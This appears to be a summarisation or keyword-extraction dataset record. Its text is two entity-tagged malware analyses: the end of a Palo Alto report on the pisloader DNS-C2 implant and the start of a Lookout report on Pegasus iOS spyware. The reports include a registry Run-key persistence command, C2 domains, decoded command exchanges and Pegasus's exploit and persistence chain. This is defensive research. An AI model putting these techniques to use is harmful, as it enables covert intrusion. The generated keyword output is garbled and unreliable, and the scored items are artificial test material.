lsm /t reg_sz /d \u201c % appdata%\\lsm.exe \u201d /fThis particular command will set the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\lsm registry key with a value of \u201c % appdata%\\lsm.exe \u201d . After this key is set , the malware proceeds to decrypt a [CARDINAL] two blobs of data with a single - byte [ORG] XOR key of [CARDINAL] 0x54 . The resulting data is written to the % appdata%\\lsm.exe file path . After this file is written , the malware executes the newly written lsm.exe file , which contains the pisloader payload . The following sample was discovered and is referenced in the subsequent analysis : MD5 : 07B9B62FB3B1C068837C188FEFBD5DE9 [PERSON] Size : [DATE] 102400 Bytes [PERSON] Compile [PERSON] Timestamp : [DATE] 2016 - 04 - 27 [TIME] 13:39:02 UTCThe payload is heavily obfuscated using a return - oriented programming ( [ORG] ROP ) technique , aswell as a number of garbage assembly instructions . In the example below , code highlighted in red essentially serves no purpose other than to deter reverse - engineering of the sample . This code can be treated as garbage and ignored . The entirety of the function is highlighted in green , where [CARDINAL] two function offsets are pushed to the stack , followed by a return instruction . This return instruction will point code execution [ORDINAL] first at the null function , which in turn will point code execution to the \u2018 next_function \u2019 . This technique is used throughout the runtime of the payload , making static analysis difficult . Figure [CARDINAL] 3 Obfuscated code witnessed in pisloaderThe malware is actually quite simplistic once the obfuscation and garbage code is ignored . It will begin by generating a random 10 - byte alpha - numeric header . The remaining data is base32- encoded , with padding removed . This data will be used to populate a subdomain that will be used in a subsequent [ORG] DNS request for a [ORG] TXT record . The use of [ORG] DNS as a C2 protocol has historically not been widely adopted by malware authors . Notable exceptions include the following : FrameworkPOSC3PRO - RACCOONFeederBotMortoPlugX VariantsThe use of [ORG] DNS as a [CARDINAL] C2 allows pisloader to bypass certain security products that may not be inspecting this traffic correctly . Figure [CARDINAL] 4 [ORG] DNS query for [ORG] TXT record by malwareThe pisloader sample will send a beacon periodically that is composed of a random [QUANTITY] 4 - byte uppercase string that is used as the payload . An example of this can be found below : Figure [CARDINAL] 5 pisloader [ORG] DNS beacon requestThe malware expects various aspects of the [ORG] DNS responses to be set in a specific way , or else pisloader will ignore the [ORG] DNS reply . The following [ORG] DNS flags must be set . Should any additional flags be set , the response will be ignored . [PRODUCT] ResponseRecursion [PRODUCT] DesiredRecursion [PRODUCT] AvailableThe \u2018 Questions \u2019 field must be set to a value of [GPE] 0x1 . [ORG] The \u2018 Answer [ORG] Resource Records \u2019 field must be set to a value of [GPE] 0x1 . Additionally , the response query subdomain must match the original [ORG] DNS request . The remote command and control ( C2 ) server is statically embedded within the malware . A single host of \u2018 [WORK_OF_ART] ns1.logitech - usa[.]com \u2019 is found in this specific sample . The [CARDINAL] C2 server will respond with a [ORG] TXT record that is encoded similar to the initial request . In the response , the [ORDINAL] first byte is ignored , and the remaining data is base32 - encoded . An example of this can be found below . Figure [CARDINAL] 6 Example TXT response by C2 serverThe following commands , and their descriptions are supported by the malware : sifo \u2013 Collect victim system informationdrive \u2013 List drives on victim machinelist \u2013 [PERSON] List file information for provided directoryupload \u2013 Upload a file to the victim machineopen \u2013 Spawn a command shellSome examples of these commands being used can be seen below . A mock [ORG] DNS server was used to generate the commands and receive the resulting data . Example sending the \u2018 drive \u2019 command:1 [DATE] 2 [DATE] 3[+ ] Sending Command : drive | Encoded : CMRZGS5TF [ + ] Raw Data Received : UMAVMGAGD0IE5FY7CDHJOHYRB2LR6A [ + ] Decoded Data Received : A:\\|C:\\|D:\\|Example sending the \u2018 open \u2019 command:1 [CARDINAL] 11[+ ] Sending Command : open | Encoded : CN5YGK3Q [ + ] Raw Data Received : ULCBMGAGCAJVUWG4TPONXWM5BAK5UW4ZDPO5ZSAW2WMVZHG2LP [ + ] Raw Data Received : ATABMGAGCBNYQDMLRRFY3TMMBRLUGQUQ3POB4XE2LHNB2CAKDD [ + ] Raw Data Received : HTPDMGAGCCFEQDEMBQHEQE22LDOJXXG33GOQQEG33SOBXXEYLU [ + ] Raw Data Received : BNJWMGAGCDNFXW4LRAEBAWY3BAOJUWO2DUOMQHEZLTMVZHMZLE [ + ] Raw Data Received : UARCMGAGCEFYGQUDIKIM5FYVLTMVZHGXCKN5ZWQICHOJ2W46TX [ + ] Raw Data Received : UJRAMGAGC0MVUWOXCEMVZWW5DPOA7A [ + ] Decoded Data Received : [ORG] Microsoft [PRODUCT] Windows [ Version 6.1.7601 ] Copyright ( c ) [DATE] 2009 [ORG] Microsoft [ORG] Corporation . All rights reserved . C:\\Users\\Josh Grunzweig\\Desktop > Example sending the \u2018 sifo \u2019 command:1 [CARDINAL] 5[+ ] Sending Command : sifo | Encoded : CONUWM3Y [ + ] Raw Data Received : FUBWMGAGIANQ6TCNZSFYYTMLRRFYYTKMZGMM6VOSKOFVGEUTCW [ + ] Raw Data Received : PGHRMGAGIBGJHEWSKPJNICAW2KN5ZWQICHOJ2W46TXMVUWOXJG [ + ] Raw Data Received : MMAZMGAGI0N46TMLBRFQZTE [CARDINAL] 10[+ ] Sending Command : list [GPE] C:\\ | Encoded : CNRUXG5BAIM5FY [ + ] Raw Data Received : QKTUMGAGLAGB6CIUTFMN4WG3DFFZBGS3T4GIYDCNJPGAZS6MRW [ + ] Raw Data Received : EKNPMGAGL0EAYTIORUGA5DKN34GB6DEMS6 [ + ] Raw Data Received : RKMAMGAGLAGF6GC5LUN5SXQZLDFZRGC5D4GIYDAOJPGA3C6MJQ [ + ] Raw Data Received : NMSIMGAGL0EAZDCORUGI5DEMD4GI2HYMZSLY [ + ] Raw Data Received : OHRWMGAGLAGB6EE33POR6DEMBRGUXTAMZPGI3CAMJWHIZDIORQ [ + ] Raw Data Received : DPDUMGAGL0GJ6DA7BSGJPA [ + ] Raw Data Received : WIKGMGAGLAGF6GE33PORWWO4T4GIYDCNBPGA3C6MRYEAYDAORS * Truncated * [ + ] Decoded Data Received : [CARDINAL] 0|$Recycle . Bin|2015/03/26 14:40:57|0|22 ^ 1The sifo command above uses the printf format string of \u2018 l=%s&c=%s&o=%s \u2019 . This is consistent with previous versions of [ORG] HTTPBrowser , which is another malware family frequently used by the [ORG] Wekby group . Additionally , a number of commands themselves , such as the \u2018 list \u2019 , \u2018 drive \u2019 , and \u2018 upload \u2019 commands are consistent with [ORG] HTTPBrowser . The formatted responses from these commands are also identical . A known [ORG] HTTPBrowser sample was spotted with similar metadata as the discussed pisloader sample , which adds further credibility that pisloader is likely a variant of this malware family . Additionally , the code used to generate these commands is available via [ORG] GitHub . The [ORG] Wekby group continues to target various high profile organizations using sophisticated malware . The pisloader malware family uses various novel techniques , such as using [ORG] DNS as a C2 protocol , as well as making use of return - oriented programming and other anti - analysis tactics . [ORG] Palo [ORG] Alto [ORG] Networks customers are protected against this threat in the following ways : [ORG] WildFire correctly identifies all pisloader samples as maliciousA pisloader [ORG] AutoFocus tag has been created in order to track this malware familyAll domains / IPs used in this attack have been flagged as malicious . An [ORG] IPS rule has been created to detect pisloader [ORG] DNS trafficExternal Resourcesurl via - custom - ropurl cyberespionageurl globalprint - us[.]com intranetwabcam[.]com login.access - mail[.]com glb.it - desktop[.]com local.it - desktop[.]com hi.getgo2[.]comShare your thoughtsMarcus on [DATE] May 26 , [DATE] 2016 [TIME] 9:39 [TIME] AM saidGreat article , well written . [PERSON] Yasir [PERSON] Irfan on [DATE] May 28 , [DATE] 2016 [TIME] 10:27 [TIME] PM saidVery informative and well craftedName * Email * WebsitePost CommentPrivacy Policy Legal Notices Site Index SubscriptionsCopyright \u00a9 2007 - 2013 Palo Alto Networks", "generated_text": "the Poison Ivy malware; APT; US; the malware; HTTPBrowser; DNS requests; the Poison Ivy malware; persistence; the registry key; Run registry key; a hive server; obfuscation techniques; the server; the domains; the attack; IP resolutions; the domains; use; the hexadecimal msgsi key; the.inv file; the.inv file; the obfuscation technique; the.siddhi.svn.dll; a.siddhi.svn.dll; a.asil file; the.asil file; the.siddhi.svn.dll; the.asil file;.msgt.svn.dll; the.csv file; the.dll file; the.siddhi.svn.dll; the.asil file; the.dll", "ref_text": "<START-1>The document describes a new malware campaign by the APT group Wekby targeting a US organization. Wekby has been active for years targeting healthcare, telecoms, aerospace, defense, and tech sectors. The malware used has ties to the HTTPBrowser family and uses DNS requests for command and control. Palo Alto Networks has named this malware pisloader. The initial dropper sets persistence in the registry Run key and drops/executes the pisloader payload. The payload uses heavy obfuscation and anti-analysis techniques including return-oriented programming and garbage code insertion. Pisloader sends DNS requests with random alphanumeric subdomains to resolve TXT records that contain base32-encoded commands. It sends periodic beacons and supports commands like system info collection, file listing, upload, and command shell. The C2 server is hardcoded as ns1.logitech-usa[.]com. Pisloader is likely a variant of HTTPBrowser due to metadata, supported commands, and formatted command responses. New domains were registered for this campaign like globalprint-us[.]com hosting the droppers. Other Poison Ivy and pisloader samples were hosted on these domains. Palo Alto Networks has detection mechanisms including WildFire classification, AutoFocus tags, malicious IP/domain blocking, and IPS rules to detect pisloader. The Wekby group continues to use sophisticated techniques like DNS for C2, return-oriented programming, and anti-analysis measures. Pisloader allows them to bypass certain security products incorrectly inspecting DNS traffic. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4507042253521127, "gpt3/lexical/rouge_rouge2": 0.15864022662889518, "gpt3/lexical/rouge_rougeL": 0.2535211267605634, "gpt3/lexical/rouge_rougeLsum": 0.2535211267605634, "gpt3_generated_text": ["The article discusses a recent attack by the APT group Wekby targeting a US-based organization. The malware used by the group, named 'pisloader', has ties to the HTTPBrowser malware family and uses DNS requests as a command and control mechanism. The malware was delivered via HTTP from a specific URL and was found to be an instance of the Poison Ivy malware family. The domains and IP resolutions used in the attack were registered shortly before being used, and the malware utilizes obfuscation techniques to evade detection and analysis. The initial dropper contains code responsible for setting persistence via the Run registry key and dropping and executing an embedded Windows executable. The malware also decrypts two blobs of data and utilizes various files such as .inv, .asil, and .dll."]}, {"split_name": "test", "sample_id": "test_49", "prompt_text": "Extract the keywords: Technical Analysis of Pegasus SpywareAn Investigation Into Highly Sophisticated Espionage SoftwareContentsExecutive SummaryBackground [ORG] Disclosure [ORG] TimelineAttack [ORG] OverviewProfessional [ORG] Grade [ORG] Development [ORG] Evolution [ORG] of SoftwareThe Trident VulnerabilitiesCVE-2016 - 4655 : Memory Corruption in [PERSON] Safari Webkit CVE-2016 - 4656 : Kernel Information Leak Circumvents KASLR CVE-2016 - 4657 : Memory Corruption in [GPE] Kernel leads to Jailbreak Jailbreak PersistenceSpyware AnalysisInstallation and PersistencePersistence : JSC Privilege EscalationDisabling Updates Stealth [ORG] Update [ORG] to [ORG] Command [ORG] & [ORG] Control [ORG] Infrastructure Self DestructionData GatheringCalendar Capturing User Passwords WiFi and [PERSON] Router [PERSON] PasswordsInterception [PERSON] of [PERSON] Calls and MessagesProcess Injection : converter ViberReal [ORG] - [ORG] Time [ORG] EspionageConclusion [ORG] Credits [ORG] Appendix [ORG] A : TLS Certificate Information Appendix B : IOCs for Jailbreak DetectionExecutive SummaryThis report is an in - depth technical look at a targeted espionage attack being actively leveraged against an undetermined number of mobile users around the world . Lookout researchers have done deep analysis on a live iOS sample of the malware , detailed in this report . [PERSON] Citizen [PERSON] Lab \u2019s investigation links the software andinfrastructure to that of [ORG] NSO [ORG] Group which offers a product called Pegasus solution . Pegasus is professionally developed and highly advanced in its use of zero [DATE] - day vulnerabilities , code obfuscation , and encryption . It uses sophisticated func- tion hooking to subvert OS- and application - layer security in voice / audio calls and apps including [PERSON] Gmail , Facebook , [ORG] WhatsApp , [ORG] Facetime , [ORG] Viber , [ORG] WeChat , [ORG] Telegram , [ORG] Apple \u2019s built - in messaging and email apps , and others . It steals the victim \u2019s contact list and GPS location , as well as personal , Wi [LOC] - Fi , and router passwords stored on the device . The iOS version of the attack uses what we refer to as [PRODUCT] Trident , an exploit of [CARDINAL] three [CARDINAL] related zero [DATE] - day vulnerabilities in [GPE] iOS , which [ORG] Apple patched in [EVENT] iOS [EVENT] 9.3.5 , available as of the publishing of this report . According to news reports , [ORG] NSO [ORG] Group sells weaponized software that targets mobile phones to governments and has been operating since [DATE] 2010 , according to its [GPE] LinkedIn page . The [ORG] Pegasus spyware has existed for a significant amount of time , and is advertised and sold for use on high - value targets for multiple purposes , including high - level espionage on iOS , [ORG] Android , and [PERSON] Blackberry . This spyware is extremely sophisticated and modular , in addition to allowing customization . It uses strong encryption to protect itself from detection by traditional security tools and has a vigorous monitoring and self - destruct mechanism . Lookout \u2019s analysis determined that the malware exploits [CARDINAL] three zero [DATE] - day vulnerabilities , [PRODUCT] Trident , in [ORG] Apple \u2019s iOS:1 . CVE-2016 - 4655 : Memory Corruption in Webkit - A vulnerability in [PERSON] Safari WebKit allows the attacker to compro - mise the device when the user clicks on a link.2 . CVE-2016 - 4656 : Kernel Information Leak - A kernel base mapping vulnerability that leaks information to theattacker that allows him to calculate the kernel \u2019s location in memory.3 . CVE-2016 - 4657 : [PERSON] Kernel [PERSON] Memory corruption leads to Jailbreak - 32 and 64 bit iOS kernel - level vulnerabilities thatallow the attacker to silently jailbreak the device and install surveillance software . The attack sequence begins with a simple phishing scheme : send a text ( or [PRODUCT] Twitter or other type of ) message with a benign - looking URL , user clicks on link , open web browser , load page , exploit a browser or operating system vulnerability , install software to gather information and to ensure that the software stays installed on the device ( \u201c persistence \u201d ) . As soon as the targeted victim clicks the link , the attack occurs silently , with no indication to the user or device administrators that anything has occurred or that any new processes are running . The Pegasus software is highly configurable : depending on the country of use and feature sets purchased by the user of the spyware , the surveillance capabilities include remotely accessing text messages , [ORG] iMessages , calls , emails , logs , and more from apps including [PERSON] Gmail , Facebook , [ORG] Skype , [ORG] WhatsApp , [PERSON] Viber , [PERSON] Facetime , [PERSON] Calendar , Line , Mail . [PERSON] Ru , [GPE] WeChat , Surespot , [GPE] Tango , [GPE] Telegram , and others . [ORG] TECHNICAL [ORG] ANALYSIS [ORG] OF [ORG] PEGASUS [ORG] SPYWARE | [CARDINAL] 3Based on artifacts in the code , this spyware has been in the wild for [DATE] more [DATE] than [DATE] two [DATE] years . The exploits have configuration settings that go all the way back to iOS 7 , which was released in [DATE] 2013 and superseded in [CARDINAL] 2014.Pegasus takes advantage of how integrated mobile devices are in our lives and the combination of features only available on mobile \u2014 always connected ( [LAW] WiFi , 3G/4 G ) , voice communications , camera , email , messaging , GPS , passwords , and contact lists . As a result of its functional modularity , the breadth of communications and user data it monitors , and the tai- lored methods it instruments into other applications to exfiltrate data from them , to date , Pegasus is the most sophisticat- ed privately - developed attack Lookout has encountered on a mobile endpoint . It hooks into widely used secure messen- ger applications to copy cleartext data out of them before the user \u2019s app can encrypt and send it . From the perspective of the user and the people they \u2019re communicating with , their communications are secure , while the administrator of the Pegasus instance has secretly intercepted the clear text of their communication . Pegasus carries a high price tag averaging at [MONEY] over $ 25,000 per target . In [CARDINAL] at [CARDINAL] least [CARDINAL] one instance , [ORG] NSO [ORG] Group sold [CARDINAL] 300 licenses for $ 8 [MONEY] million USD.1This report presents the technical details of the attack from the beginning of the exploit chain to the end . It includes analysis of the [PRODUCT] Trident zero [DATE] - day iOS vulnerabilities that the toolkit was using to jailbreak the phone . We also look in - depth at the components of the espionage software , and have exposed the type of capabilities that an advanced mobile attack- er using this software possesses . Trident ( the vulnerabilities disclosed in coordination with this report ) were present in the latest versions of [GPE] iOS , up to iOS 9.3.4 , the latest iOS version as of [DATE] August [DATE] 2016 when we made these discoveries . Researchers from Lookout and [PERSON] Citizen [PERSON] Lab responsibly disclosed the exploits and their related vulnerabilities to [ORG] Apple . Given the severity of [PRODUCT] Trident , [ORG] Apple worked extremely quickly to patch these vulnerabilities and has released iOS [CARDINAL] 9.3.5 to address them . With the release of the patched OS , we are publishing the technical details of the attack and exploits.1 url [ORG] ANALYSIS [ORG] OF [ORG] PEGASUS [ORG] SPYWARE | [CARDINAL] 4BackgroundAs mobile phones continue to be tightly integrated into our personal and work lives , malicious actors are actively creating sophisticated applications that can run on victims \u2019 devices without either their knowledge of the threat \u2019s presence , or of the actors \u2019 intent . This can be seen in the diversity of threats that target mobile devices : from those that are financially mo- tivated , such as adware , banking trojans , and SMS fraud , to those seeking personal information or corporate intellectual property . Spyware , a malicious application designed to retrieve specific information from an infected device without the victim \u2019s knowledge , falls into the latter camp . Spyware applications often include the ability to extract a victim \u2019s SMS messages , contact details , record their calls , access their call logs , or remotely activate a device \u2019s microphone and camera to surreptitiously capture audio , video , and image content . In addition to these rich features , some spyware also has the equally important ability to remotely deliver the malicious application to a target device . This is a complex and technically challenging problem , as evidenced by the amount of money private security firms and corporate bug bounty programs pay for zero [DATE] - day exploits that facilitate this remote delivery . [CARDINAL] Two private security firms , [ORG] Gamma [ORG] Group [ORG] and [ORG] Hacking [ORG] Team , both made headlines after media outlets revealed that the organizations developed mobile surveillance software that has been sold to oppressive governments . These products are often very expensive and generally only accessible to well - funded attackers given the complexity involved in creating this kind of mobile spyware , and the fact that it includes zero [DATE] - day exploits . The [NORP] Israeli based [ORG] NSO [ORG] Group has managed to avoid the spotlight of the cyber security community despite being in oper- ation for [DATE] over [DATE] five [DATE] years . Founded in [DATE] 2010 by [ORG] Niv [ORG] Carmi , [PERSON] Shalev [PERSON] Hulio , and Omri Lavie , [ORG] NSO [ORG] Group has publicly stated that it develops and sells mobile phone surveillance software to governments around the world . It has claimed that its surveil- lance capability is undetectable with one of the founders stating , \u201c We \u2019re a complete ghost . \u201d [CARDINAL] 2 Private equity firm [ORG] Francisco [ORG] Partners acquired [ORG] NSO [ORG] Group in [DATE] 2014 for $ 110 [MONEY] million . The founders of [ORG] NSO [ORG] Group play in both the cyber offense and defense spaces , having also founded the mobile security company Kaymera.32 url [CARDINAL] 3 url ANALYSIS OF PEGASUS SPYWARE | 5Disclosure TimelineCitizen Lab reported the existence of the malware to Lookout on [DATE] August 12 , [DATE] 2016 . Lookout and [PERSON] Citizen [PERSON] Lab worked together to analyze the software and attempt to determine the severity of the vulnerabilities and the capabilities of the malware until [DATE] August 15 , [DATE] 2016 when we reported the information to [ORG] Apple . The [CARDINAL] three organizations worked together from [DATE] August 15 , [DATE] 2016 to the release of the vulnerability patches in iOS [CARDINAL] 9.3.5 on [DATE] August [DATE] 25 , [CARDINAL] 2016.TECHNICAL [ORG] ANALYSIS [ORG] OF [ORG] PEGASUS [ORG] SPYWARE | [CARDINAL] 6Attack OverviewThe attack is very simple in its delivery and silent in delivering its payload . The attack starts when the attacker sends a website URL ( through SMS , email , social media , or any other message ) to an identified target . The user only has to take one action -- click on the link . Once the user clicks the link , the software silently carries out a series of exploits against the victim \u2019s device to remotely jailbreak it so that the espionage software packages can be installed . The user \u2019s only indication that anything happened will be that the browser closes after the link is clicked . The espionage software contains malicious code , processes , and apps that are used to spy , collect data , and report back what the user does on the device . This spyware can access and exfiltrate messages , calls , emails , logs , and more from apps including , but not limited to : Facetime TelegramCVE-2016 - 4655 Exploit against [CARDINAL] SafariTwo kernel exploits ( CVE-2016 [ORG] - 4656 [ORG] & CVE-2016 [ORG] - 4657 ) jailbreak the device1 . Persistence and stealth monitoring2 . Establishes communication to [ORG] Command [ORG] & [ORG] Control [ORG] Infrastructure3 . Hooks all communication and starts stealing dataIn order to accomplish this , the spyware , once it jailbreaks the user \u2019s phone , does not download malicious versions of these apps to the victim \u2019s device in order to capture data , rather it compromises the original apps already installed on the device . This includes pre - installed apps such as Facetime and [PERSON] Calendar and those from the official [PERSON] App [PERSON] Store . Usually , iOS security mechanisms prevent normal apps from spying on each other , but spying \u201c hooks \u201d can be installed on a jailbroken device . Pegasus takes advantage of both the remote jailbreak exploit and a technique called \u201c hooking . \u201d The hooking is accomplished by inserting Pegasus \u2019 dynamic libraries into the legitimate processes running on the device . These dynamic libraries can be used to hook the apps using a framework called [ORG] Cydia [ORG] Mobile [ORG] Substrate , known to the iOS jailbreak community , and which [ORG] Pegasus uses as part of the exploit . A user infected with this spyware is under complete surveillance by the attacker because , in addition to the apps listed above , it also spies on : \u2022 Audio and video communications that ( in the words a founder of [ORG] NSO [ORG] Group ) turns the phone into a \u201c walkie - talkie\u201d4SMS messages the victim sends or receives4 url ft.com%2Fcms%2Fs%2F0%2F9869fd34 - c7ac-11e2 - be27 - 00144feab7de.html%3Fsiteedition%3Dintl&_i_referer=&classification = conditional_stan- dard&iab = barrier - app#axzz4I8PLStjSTECHNICAL ANALYSIS OF PEGASUS SPYWARE | [CARDINAL] 7Access to this content could be used to gain further access into other accounts owned by the target , such as banking , email , and other services he / she may use on or off the device . The attack is comprised of [CARDINAL] three separate stages that contain both the exploit code and the espionage software . The stages are sequential ; each stage is required to successfully decode , exploit , install , and run the subsequent stage . Each stage leverages [CARDINAL] one of the [PRODUCT] Trident vulnerabilities in order to run successfully . STAGE 1 Delivery and WebKit vulnerability : This stage comes down over the initial URL in the form of an HTML file ( [DATE] 1411194s ) that exploits a vulnerability ( CVE-2016 - 4655 ) in WebKit ( used in [PERSON] Safari and other browsers).STAGE 2 Jailbreak : This stage is downloaded from the [ORDINAL] first stage code based on the device type ( 32 [QUANTITY] - bit vs 64- bit ) . Stage 2 is downloaded as an obfuscated and encrypted package . Each package is encrypted with unique keys at each download , making traditional network - based controls ineffective . It contains the code that is needed to exploit the iOS Kernel ( CVE-2016 - 4656 and CVE-2016 [LAW] - 4657 ) and a loader that downloads and decrypts a package for stage 3.STAGE 3 Espionage software : This stage is downloaded by stage [CARDINAL] 2 and is also based on the device type ( 32 [QUANTITY] - bit vs [CARDINAL] 64 - bit ) . Stage [CARDINAL] 3 contains the espionage software , daemons , and other processes that are used after the de- vice has been jailbroken in stage [CARDINAL] 2 . Stage 3 installs the hooks into the applications the attacker wishes to spy on . Additionally , stage [CARDINAL] 3 detects if the device was previously jailbroken through another method and , if so , removes any access to the device that the jailbreak provides , such as via [ORG] SSH . The software also contains a failsafe to remove itself if certain conditions are present . The [ORDINAL] third stage deploys a number of files deployed in [DATE] a [DATE] standard [DATE] unix [DATE] tarball ( test222.tar ) , each of which has its own pur- pose ( that we describe later in this report):\u2022 [NORP] \u2022\u2022ca.crt - root TLS certificate that is added to keystore ( see Appendix A ) ccom.apple.itunesstored.2.csstore - Standalone javascript that is run from the command line at reboot and is used to run unsigned code and jailbreak the kernel on device reboot converter - injects dylib in a process by pid . It is a renamed version of the cynject from the [GPE] Cydia open - source library libaudio.dylib - The base library for call recording libdata.dylib - A renamed version of the [GPE] Cydia substrate open - source library libimo.dylib - Generic chat sniffer library [PERSON] libvbcalls.dylib [PERSON] - [PERSON] Viber sniffer [PERSON] libwacalls.dylib [PERSON] - [PERSON] Whatsapp sniffer lw - install - Spawns all sniffing services systemd - Sends reports and files to server\u2022 \u2022 workerd - SIP moduleThe attack we investigated works on iOS up to [CARDINAL] 9.3.4 . The developers maintain a large table in their code that attacks all iOS versions from [CARDINAL] 7.0 up to and including iOS 9.3.3 . While the code we investigated did not contain the appropriate values to initially work on iOS 9.3.4 , the exploits we investigated would still work , and it is trivial for the attackers to update the table so that the attack will work on [ORG] 9.3.4.TECHNICAL [ORG] ANALYSIS [ORG] OF [ORG] PEGASUS [ORG] SPYWARE | [CARDINAL] 8One other unique property of this attack is that standard jailbreak detections fail to report that the device has been ex- ploited . The attack and installation of the spying software is designed to be as silent as possible to the target . [ORG] Professional [ORG] Grade [ORG] Development [ORG] Pegasus is well designed in terms of its modularity and efficiency . For example , the kernel exploits call upon magic tables for each of the platforms that map out kernel memory for each version and phone model . The mapping for iOS 9.2.1 on the iPhone 6 is shown here : TECHNICAL ANALYSIS OF PEGASUS SPYWARE | 9Note that each function location in memory ( as an offset from the base of the kernel ) is mapped . Each of these will be used later in the kernel version . Additionally , the code is extremely modular , relative to other malware our researchers have encountered . We found com- mon libraries and common formats with similar naming conventions . For example , the libwacalls ( [ORG] WhatsApp Call Library ) and libvbcalls ( [WORK_OF_ART] Viber [WORK_OF_ART] Call [WORK_OF_ART] Library ) use similar formats with similar function names and common standards . Unlike most malware authors , the code in Pegasus is clean and efficient , with evidence of professional and careful design . Finally , we see evidence of a robust quality assurance process for their development : even their [ORDINAL] first stage exploit con- tains both debugging and QA - specific functions of the type one would expect from an enterprise - class software develop- ment organization . Evolution of Software The malware has been in operation for [DATE] well [DATE] over [DATE] a [DATE] year , which has enabled it to develop a degree of software maturity , and as a result it is capable of exploiting multiple iOS versions . An excerpt from the magic table that maps addresses in the kernel shows that the exploit supports versions of the phone from the iPhone 4s up to the iPhone 6s Plus . The kernel exploit includes checks that indicate that the exploit works against iOS 7 ( which was released in 013):TECHNICAL [ORG] ANALYSIS [ORG] OF [ORG] PEGASUS [ORG] SPYWARE | [CARDINAL] 10The [PRODUCT] Trident [PRODUCT] VulnerabilitiesThe software contains multiple zero [DATE] - day vulnerabilities , referred to here as [PRODUCT] Trident , used against iOS 9.3.3 , each of which would have worked against current [CARDINAL] 9.3.4 as of the date of discovery . With the [CARDINAL] 9.3.5 patches , these vulnerabilities will no longer work . CVE-2016 - 4655 : Memory Corruption in [ORG] Safari [ORG] Webkit A memory corruption vulnerability exists in [PERSON] Safari [PERSON] Webkit that allows an attacker to execute arbitrary code . Pegasus ex- ploits this vulnerability to obtain initial code execution privileges within the context of the [PERSON] Safari web browser . This vulnerability is complex and Lookout continues to work on analyzing this vulnerability and will publish additional findings as they become available . CVE-2016 - 4656 : Kernel Information Leak Circumvents KASLR Before Pegasus can execute its jailbreak , it must determine where the kernel is located in memory . [ORG] Kernel [ORG] Address [ORG] Space Layout Randomization ( [ORG] KASLR ) makes this task difficult by mapping the kernel into different and unpredictable locations in memory . In short , before attacking the kernel , Pegasus has to find it . The attacker has found a way to locate the kernel by using a function call that leaks a non - obfuscated kernel memory address in the return value , allowing the kernel \u2019s actual memory location to be mapped . CVE-2016 [PRODUCT] - 4657 : Memory Corruption in [GPE] Kernel leads to Jailbreak The [ORDINAL] third vulnerability in Pegasus \u2019 [PRODUCT] Trident is the one that is used to jailbreak the phone . A memory corruption vulnerability in the the kernel is used to corrupt memory in both the 32- and [CARDINAL] 64 - bit versions . The exploits are performed differently on each version . This vulnerability is complex and Lookout continues to work on analyzing this vulnerability and will publish additional findings as they become available . Jailbreak Persistence Once the kernel has been exploited , both exploits perform similar tasks to prepare the system to be jailbroken : \u2022 Disable kernel security protections including code signing \u2022 \u2022 Clear the [ORG] Safari caches ( to help cover their tracks ) \u2022 Write the jailbreak files ( including the main loader as /sbin / mount_nfs)Remount the system partitionTo gain persistence , Pegasus replaces the system daemon rtbuddyd with a copy of the jsc binary and creates a link to a script that is similar to the exploit for CVE-2016 - 4655 , which we will describe later . As a final step , the exploit removes /etc / nfs.conf which triggers the file to load /sbin / mount_nfs ( which is the stage [CARDINAL] 3 jail- break loader ) . Because /sbin / mount_nfs is run as root , the code is run with full privileges . [PERSON] Spyware [PERSON] AnalysisPegasus is one of the most sophisticated pieces of surveillance and espionage software that Lookout has investigated . It has a novel mechanism to install and hide itself and obtain persistence on the system . Once it is resident , it uses a num- ber of ways to hide its communications and protect itself from discovery , and it hooks into a large number of the phone \u2019s functions in order to gather data and intercept messages and calls . Installation and Persistence The spyware is installed during the stage [CARDINAL] 3 execution by running the lw - install binary . Lw - install sets up a few of the key structures of the product , as well as establishes persistence across reboots ( and has a few protective functions to ensure that the software does n\u2019t accidentally brick the phone).The first thing that lw - install does is check the iOS version ; it runs different commands depending on whether it is running on [LAW] iOS [LAW] 9 [LAW] or [LAW] a previous version . If it is installed on [EVENT] iOS [EVENT] 9 , lw - install runs \u201c /sbin / launchctl load \u201d on .plist files dropped into /Library / LaunchDaemons ( which is normally empty or used to hold launchd plists for jailbroken services , such as sshd ) . This will ensure that these files get launched and started on reboot . If the OS is not iOS 9 , the [ORDINAL] first thing that lw - install does is remove the following files : Then it startsNote that lw_install appears to log to /private / var / wireless / [ORG] Library / com.apple.wifid.r.logTECHNICAL [ORG] ANALYSIS [ORG] OF [ORG] PEGASUS [ORG] SPYWARE | 12Persistence : JSC Privilege Escalation Pegasus implements its persistence mechanism through the use of a developer tool called \u201c jsc \u201d that is part of the iOS environment . Jsc is intended to allow users to execute javascript using the webkit engine outside the context of a web browser.6 In this case , a memory corruption issue in the tool is used by Pegasus to attain persistence . As part of the installation process for persistence , the daemon rtbuddyd is replaced by a copy of jsc ( which is a signed binary and allowed to run code ) . On device reboot rtbuddyd will run and load --early - boot , which is a link to the com.apple.itunesstored.2.cstore file . The com.apple.itunesstored.2.csstore file is structured similarly to the exploit for CVE-2016 - 4655 . This loads shellcode which is used to re - exploit the kernel each time that the system is rebooted and start the running daemons . The execution flow of this code is:\u2022 \u2022Run the jsc script calling --early - boot [PERSON] Run the exploit that maps the kernel base Run the kernel exploit [PERSON] Spawn the main running daemons of Pegasus : systemd , [CARDINAL] watchdogdTECHNICAL ANALYSIS OF [ORG] PEGASUS [ORG] SPYWARE | 13As [ORG] Citizen [ORG] Lab mentioned in their report , Pegasus puts its own protection above all else . From the manual , as quoted by [PERSON] Citizen [PERSON] Lab : In general , we understand that it is more important that the source will not be exposed and the target will suspect nothing than keeping the agent alive and working . To this end , Pegasus has a large number of features that enable it to maintain its secrecy . It constantly monitors the phone for status and disables any other access to the phone by previous / other jailbreaking software . Pegasus also contains a complex self - destruct mechanism which completely removes it from the phone . Disabling Updates The Stage 3 loader ensures that the phone wo n\u2019t receive auto - updates going forward : [ORG] TECHNICAL [ORG] ANALYSIS [ORG] OF [ORG] PEGASUS [ORG] SPYWARE | 14Jailbreak Detection The stage [CARDINAL] 3 loader also checks the device to see if it had been previously jailbroken : The software also checks during each startup : Device Monitoring In order to maintain its ability to run , communicate and monitor its own status , the software disables the phone \u2019s \u201c [WORK_OF_ART] Deep [WORK_OF_ART] Sleep \u201d functionality : TECHNICAL ANALYSIS OF PEGASUS SPYWARE | 15The software also keeps a close eye on the battery status of the current device : Additionally , the software monitors the current connection state and tracks which types of networks the phone is connect- ed to , 